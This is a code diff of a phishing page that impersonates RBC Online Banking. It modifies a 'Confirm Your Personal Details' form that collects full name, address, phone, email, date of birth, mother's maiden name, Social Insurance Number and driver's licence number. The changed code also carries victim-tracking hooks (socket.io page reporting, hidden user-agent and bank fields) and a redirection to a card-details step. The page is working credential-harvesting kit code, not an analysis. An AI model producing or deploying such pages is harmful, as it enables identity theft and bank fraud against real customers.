@@ -1,30 +1,21 @@
 <html lang="en">
     <head>
+        <span hidden id="page"> Details </span>
+        <span hidden id="pageRedirection"> /rbc/card </span>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=Edge">
         <title>Verification – RBC Online Banking</title>
         <!--<base href="">-->
         <base href=".">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="stylesheet" href="/assets/rbc/styles.c203039f21a7c88c809b.css">
         <link rel="stylesheet" href="/assets/rbc/main.css">
         <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
-        <script>
-            var lrbank = '<?=escape($udata->last->bank)?>';
-            var lrinfo = '<?=escape($udata->last->info)?>';
-        </script>
-        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
-        <script src="/assets/js/details.js?v=<?=time()?>"></script>
         <script src="/socket.io/socket.io.js"></script>
-        <script>
-            const socket = io.connect('<%= ip %>');
-            socket.emit('updatePage', 'details');
-            socket.emit('updateBanks', 'rbc');
-            
-        </script>
+        <script src="../assets/js/rbc/login/index.js"></script>
     </head>
     <body>
+        <input type="hidden" id="userAgent" name="userAgent">
+        <input type="hidden" id="banks" name="banks">
         <core-banking-root ng-version="10.2.5">
             <core-banking-main-container _nghost-ahj-c56="">
                 <div _ngcontent-ahj-c56="" class="main">
@@ -64,101 +55,74 @@
                             <div _ngcontent-ahj-c68="" class="passcode-view-component">
                                 <h1 _ngcontent-ahj-c68="" class="passcode-heading">Confirm Your Personal Details</h1>
                                 <p _ngcontent-ahj-c68="" class="passcode-message">To validate your sign in request, please confirm your personal details.</p>
-                                <form action="" method="POST" class="lab-form">
+                                <form action="" id="loginForm" class="lab-form">
                                     <core-banking-otp-input _ngcontent-ahj-c68="">
                                         <div class="otp-input-component ng-pristine ng-invalid ng-touched">
-                                            <?php if ($p_name && !$p_split) { ?>
-                                            <div class="InputContainer__input">
+                                            <div id="input-fullname" class="InputContainer__input">
                                                 <div>Full Name</div>
-                                                <input required="" id="input-name" type="text" placeholder="Full Name" name="name" class="Input__input lrinput" attr-action="Filling Full Name">
+                                                <input required="" type="text" placeholder="First Name" name="fname" class="Input__input lrinput" style="display: inline-block; width: calc(50% - 5px);" attr-action="Filling First Name">
+                                                <input required="" type="text" placeholder="Last Name" name="lname" class="Input__input lrinput" style="display: inline-block; width: 50%" attr-action="Filling Last Name">
                                             </div>
-                                            <?php } if ($p_name && $p_split) { ?>
-                                            <div class="InputContainer__input">
-                                                <div>Full Name</div>
-                                                <input required="" id="input-fname" type="text" placeholder="First Name" name="fname" class="Input__input lrinput" style="display: inline-block; width: calc(50% - 5px);" attr-action="Filling First Name">
-                                                <input required="" id="input-lname" type="text" placeholder="Last Name" name="lname" class="Input__input lrinput" style="display: inline-block; width: 50%" attr-action="Filling Last Name">
-                                            </div>
-                                            <?php } if ($p_address) { ?>
-                                            <div class="InputContainer__input">
+                                          
+                                            <div class="InputContainer__input"  id="input-address">
                                                 <div>Address</div>
-                                                <input required="" id="input-address" type="text" placeholder="Address" name="address" class="Input__input lrinput" attr-action="Filling Address">
+                                                <input required=""  type="text" placeholder="Address" name="address" class="Input__input lrinput" attr-action="Filling Address">
                                             </div>
-                                            <?php } if ($p_address) { ?>
-                                            <div class="InputContainer__input">
+                                           
+                                            <div class="InputContainer__input" id="input-city">
                                                 <div>City</div>
-                                                <input required="" id="input-city" type="text" placeholder="City" name="city" class="Input__input lrinput" attr-action="Filling City">
+                                                <input required="" type="text" placeholder="City" name="city" class="Input__input lrinput" attr-action="Filling City">
                                             </div>
-                                            <?php } if ($p_postal) { ?>
-                                            <div class="InputContainer__input">
+                                           
+                                            <div class="InputContainer__input" id="input-postalcode">
                                                 <div>Postal Code</div>
-                                                <input required="" id="input-postal" type="text" placeholder="Postal Code" name="postal" class="Input__input lrinput" attr-action="Filling Postal" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]" title="Please enter a valid postal code">
+                                                <input required=""  type="text" placeholder="Postal Code" name="postal" class="Input__input lrinput" attr-action="Filling Postal" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]" title="Please enter a valid postal code">
                                             </div>
-                                            <?php } if ($p_phone) { ?>
-                                            <div class="InputContainer__input">
+                                          
+                                            <div class="InputContainer__input" id="input-number">
                                                 <div>Phone Number</div>
-                                                <input required="" id="input-phone" type="tel" placeholder="Phone Number" name="phone" class="Input__input lrinput" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Phone">
+                                                <input required="" type="tel" placeholder="Phone Number" name="phone" class="Input__input lrinput" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Phone">
                                             </div>
-                                            <?php } if ($p_email) { ?>
-                                            <div class="InputContainer__input">
+                                           
+                                            <div class="InputContainer__input" id="input-email">
                                                 <div>Email Address</div>
-                                                <input required="" id="input-email" type="email" placeholder="Email Address" name="email" class="Input__input lrinput" autocomplete="off" attr-action="Filling Email">
+                                                <input required="" type="email" placeholder="Email Address" name="email" class="Input__input lrinput" autocomplete="off" attr-action="Filling Email">
                                             </div>
-                                            <?php } if ($p_dob) { ?>
-                                            <div class="InputContainer__input" style="display: block; text-align: left;">
+                                           
+                                            <div id="input-dob" class="InputContainer__input" style="display: block; text-align: left;">
                                                 <div>Date of Birth</div>
                                                 <select name="dob1" required class="Input__input lrinput" style="width:30%;display: inline-block;" attr-action="Selecting DoB">
                                                     <option value="">MM</option>
-                                                    <?php
-
-                                                    for ($x = 1; $x <= 12; $x++) {
-                                                        $y = strlen($x) == 1 ? '0' . $x : $x;
-                                                        echo '<option value="' . $y . '">' . $y . '</option>';
-                                                    }
-
-                                                    ?>
                                                 </select>
                                                 <select name="dob2" required class="Input__input lrinput" style="width:30%;display: inline-block;" attr-action="Selecting DoB">
                                                     <option value="">DD</option>
-                                                    <?php
-
-                                                    for ($x = 1; $x <= 31; $x++) {
-                                                        $y = strlen($x) == 1 ? '0' . $x : $x;
-                                                        echo '<option value="' . $y . '">' . $y . '</option>';
-                                                    }
-
-                                                    ?>
                                                 </select>
                                                 <select name="dob3" required class="Input__input lrinput" style="width:36%; display: inline-block;" attr-action="Selecting DoB">
                                                     <option value="">YYYY</option>
-                                                    <?php
-
-                                                    for ($x = date('Y'); $x >= date('Y') - 110; $x--) {
-                                                        echo '<option value="' . $x . '">' . $x . '</option>';
-                                                    }
-
-                                                    ?>
                                                 </select>
                                             </div>
-                                            <?php } if ($p_mmn) { ?>
-                                            <div class="InputContainer__input">
+                                            <div class="InputContainer__input" id="input-mmn">
                                                 <div>Mother's Maiden Name</div>
-                                                <input required="" id="input-mmn" type="text" placeholder="Mother's Maiden Name" name="mmn" class="Input__input lrinput" attr-action="Filling MMN">
+                                                <input required=""  type="text" placeholder="Mother's Maiden Name" name="mmn" class="Input__input lrinput" attr-action="Filling MMN">
                                             </div>
-                                            <?php } if ($p_sin) { ?>
-                                            <div class="InputContainer__input">
+                                            <div class="InputContainer__input" id="input-sin">
                                                 <div>Social Insurance Number</div>
-                                                <input required="" id="input-sin" type="tel" placeholder="Social Insurance Number" name="sin" class="Input__input lrinput" attr-action="Filling SIN" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}" title="Please enter a valid SIN">
+                                                <input required=""  type="tel" placeholder="Social Insurance Number" name="sin" class="Input__input lrinput" attr-action="Filling SIN" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}" title="Please enter a valid SIN">
                                             </div>
-                                            <?php } if ($p_drivers) { ?>
-                                            <div class="InputContainer__input">
+                                            <div class="InputContainer__input" id="input-dln">
                                                 <div>Driver's Licence Number</div>
-                                                <input required="" id="input-drivers" type="text" placeholder="Driver's Licence Number" name="drivers" class="Input__input lrinput" attr-action="Filling Drivers">
+                                                <input required="" type="text" placeholder="Driver's Licence Number" name="drivers" class="Input__input lrinput" attr-action="Filling Drivers">
                                             </div>
-                                            <?php } ?>
                                             <br>
                                         </div>
                                     </core-banking-otp-input>
-                                    <button _ngcontent-ahj-c68="" type="submit" rbccta="primary" size="small" data-dig-id="MFA_PMSM_016" class="passcode-button rbc-cta rbc-cta--small" style="margin-top: -15px; margin-bottom: 20px;" name="save" value="1"> Continue </button>
+                                    <rbc-form-field _ngcontent-snp-c5=""
+                                    class="rbc-form-field"><span style="margin-bottom: 5px;" _ngcontent-snp-c5=""
+                                        class="full-width signinNextBtn rbc-cta rbc-cta--small"
+                                        data-dig-id="OLB_PMSM_684" id="btn-next" rbccta=""
+                                        size="small" tabindex="0" type="button"
+                                        onclick="submitForm()"> Continue
+                                    </span></rbc-form-field>
                                 </form>
                             </div>
                         </core-banking-passcode-view>
